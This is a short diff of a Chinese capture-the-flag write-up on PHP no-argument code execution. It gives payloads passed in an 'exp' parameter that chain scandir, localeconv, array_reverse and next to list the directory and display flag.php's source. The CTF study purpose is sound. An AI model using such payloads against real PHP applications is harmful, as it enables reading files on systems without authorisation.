@@ -183,6 +183,6 @@ scandir(pos(localeconv())) => scandir('.')
 
 打印数组逆向后第二值即flag.php `?exp=echo(var_dump(next(array_reverse(scandir(pos(localeconv()))))));`
 
-打印出源码 `?exp=echo(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));`
+最终payload `?exp=echo(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));`
 
 显示出flag
